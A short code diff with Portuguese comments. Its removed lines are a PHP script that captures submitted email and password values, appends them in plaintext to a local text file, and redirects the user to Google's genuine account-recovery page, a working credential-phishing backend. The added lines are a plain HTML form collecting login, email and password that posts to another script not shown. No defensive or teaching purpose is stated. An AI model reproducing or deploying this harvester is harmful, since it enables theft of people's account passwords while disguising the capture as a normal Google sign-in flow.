@@ -1,18 +1,12 @@
-<?php
-// login.php
+<form method="POST" action="salvar.php">
+  <label for="login">Login:</label>
+  <input type="text" name="login" id="login" required><br>
 
-// Verifica se os campos foram enviados corretamente
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $email = isset($_POST['email']) ? $_POST['email'] : '';
-    $senha = isset($_POST['senha']) ? $_POST['senha'] : '';
+  <label for="email">Email:</label>
+  <input type="email" name="email" id="email" required><br>
 
-    // Salva os dados em um arquivo de texto local
-    file_put_contents("credenciais.txt", "Email: " . $email . " | Senha: " . $senha . "\n", FILE_APPEND);
+  <label for="senha">Senha:</label>
+  <input type="password" name="senha" id="senha" required><br>
 
-    // Redireciona o usuário para o login oficial do Google
-    header("Location: https://accounts.google.com/signin/v2/recoveryidentifier");
-    exit();
-} else {
-    echo "Acesso inválido.";
-}
-?>
+  <button type="submit">Salvar</button>
+</form>
